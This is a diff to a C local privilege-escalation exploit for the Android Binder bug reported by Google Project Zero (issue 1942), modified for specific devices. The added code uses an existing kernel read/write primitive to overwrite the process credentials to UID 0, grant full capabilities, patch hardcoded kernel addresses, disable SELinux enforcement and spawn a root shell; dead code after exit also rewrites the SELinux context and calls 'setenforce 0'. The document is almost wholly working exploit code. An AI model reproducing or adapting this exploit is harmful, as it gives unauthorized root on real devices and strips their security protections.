@@ -4,6 +4,8 @@
  * https://bugs.chromium.org/p/project-zero/issues/detail?id=1942
  *
  * Jann Horn & Maddie Stone of Google Project Zero
+ * Some stuff from Grant Hernandez to achieve root (Oct 15th 2019)
+ * Modified by Alexander R. Pruss for devices where WAITQUEUE_OFFSET is 0x98
  *
  * 3 October 2019
 */
@@ -370,12 +372,25 @@ void kernel_write_ulong(unsigned long kaddr, unsigned long data) {
 void kernel_write_uint(unsigned long kaddr, unsigned int data) {
   kernel_write(kaddr, &data, sizeof(data));
 }
+void kernel_write_uchar(unsigned long kaddr, unsigned char data) {
+  kernel_write(kaddr, &data, sizeof(data));
+}
 
 // $ uname -a
 // Linux localhost 3.18.71-perf+ #1 SMP PREEMPT Tue Jul 17 14:44:34 KST 2018 aarch64
 #define OFFSET__task_struct__stack 0x008
+#define OFFSET__task_struct__mm    0x308
 //#define OFFSET__task_struct__comm 0x558 // not needed
 #define OFFSET__task_struct__cred 0x550
+#define OFFSET__cred__uid 0x004
+#define OFFSET__cred__securebits    0x024
+#define OFFSET__cred__cap_inheritable 0x028
+#define OFFSET__cred__cap_permitted 0x030
+#define OFFSET__cred__cap_effective 0x038
+#define OFFSET__cred__cap_bset      0x040
+#define OFFSET__cred__cap_ambient   0x048
+#define OFFSET__cred__security      0x078
+#define OFFSET__cred__user_ns       0x088
 
 //#define OFFSET__task_struct__mm 0x520
 //#define OFFSET__mm_struct__user_ns 0x300
@@ -415,29 +430,99 @@ int main(int argc, char** argv) {
 
   setbuf(stdout, NULL);
   printf("should have stable kernel R/W now\n");
-
+  
   char task_struct_data[0x1000];
   kernel_read(task_struct_ptr, task_struct_data, sizeof(task_struct_data));
   printf("task_struct\n");
   hexdump_memory(task_struct_data, sizeof(task_struct_data));
   printf("pid = %x\n", getpid());
 
+  /*
+  unsigned long mm_ptr = kernel_read_ulong(task_struct_ptr+OFFSET__task_struct__mm);
+  char mm_data[0x1000];
+  kernel_read(mm_ptr, mm_data, sizeof(mm_data));
+  printf("mm\n");
+  hexdump_memory(mm_data, sizeof(mm_data)); */
+  
   printf("cred\n");
   unsigned long cred_ptr = kernel_read_ulong(task_struct_ptr+OFFSET__task_struct__cred);
   char cred_data[0x200];
   kernel_read(cred_ptr, cred_data, sizeof(cred_data));
   hexdump_memory(cred_data, sizeof(cred_data));  
   for (int i = 0; i < 8; i++)
-    kernel_write_uint(cred_ptr+4 + i*4, 0);
+    kernel_write_uint(cred_ptr+OFFSET__cred__uid + i*4, 0);
 
   if (getuid() != 0) {
-    printf("Error changing our UID to root.\n");
+    printf("MAIN: Error changing UIDs to 0.\n");
     exit(1);
   }
+  
+  printf("MAIN: UID = 0\n");  
+  
+  // reset securebits
+  kernel_write_uint(cred_ptr+OFFSET__cred__securebits, 0);
 
-  printf("UIDs changed to root!\n");  
+  //kernel_write_ulong(cred_ptr+OFFSET__cred__cap_inheritable, 0x3fffffffffUL);
+  kernel_write_ulong(cred_ptr+OFFSET__cred__cap_permitted, 0x3fffffffffUL);
+  kernel_write_ulong(cred_ptr+OFFSET__cred__cap_effective, 0x3fffffffffUL);
+  kernel_write_ulong(cred_ptr+OFFSET__cred__cap_bset, 0x3fffffffffUL);
+  //kernel_write_ulong(cred_ptr+OFFSET__cred__cap_ambient, 0x3fffffffffUL);
+  
+  printf("MAIN: enabled capabilities\n");
+  
+/*  FILE* f = fopen("/proc/kallsyms", "r");
+  char line[1024];
+  while(NULL != (fgets(line, 1024, f))) puts(line); */
+  
+  unsigned long user_ns = kernel_read_ulong(cred_ptr+OFFSET__cred__user_ns);
+  printf("user_ns = %lx\n", user_ns);
+  
+  printf("SECCOMP %d\n", prctl(PR_GET_SECCOMP));
+  
+  unsigned long pk1 = 0xffffffc001403b70+0x888;
+  unsigned long pk2 = 0xffffffc001403b70+0x898;
+  
+  // enable kallsyms
+  kernel_write_uchar(pk1+2, ' ');
+  kernel_write_uchar(pk2+2, ' ');
+  
+  unsigned long selinuxenforcing = 0xffffffc0019eea94;
+  kernel_write_uint(selinuxenforcing, 0);
   
   system("sh");
+  
+ /*
+  unsigned long base = user_ns; // 0xffffffc01a4bf8; //0xffffffc01c0000;
+  unsigned long size = 10*1024*1024;
+  for (unsigned long i=0; i<size ;i+=PAGE) {
+      char buf[PAGE];
+      printf("at %lx:\n", base-i);
+      kernel_read(base-i, buf, PAGE);
+      hexdump_memory(buf, PAGE);
+  }
+*/
+  
+  
+  exit(0);
+
+
+  unsigned long current_cred_security = kernel_read_ulong(cred_ptr+OFFSET__cred__security);
+  printf("[+] security %lx\n", current_cred_security);
+  
+ for (int i = 0; i < 2; i++)
+    kernel_write_uint(current_cred_security + i*4, 1);
+  printf("[+] before 2\n");
+  kernel_write_uint(current_cred_security + 0, 1);
+  printf("[+] before 3\n");
+  kernel_write_uint(current_cred_security + 8, 7);
+
+  kernel_write_ulong(current_cred_security, 0x0100000001UL);
+
+  kernel_write_uint(current_cred_security + 8, 7);
+  printf("[+] SID -> init (7)\n");
+  printf("MAIN: set SID\n");
+  
+  system("setenforce 0");
   
 #if 0 // TODO
   /* in case you want to do stuff with the creds, to show that you can get them: */
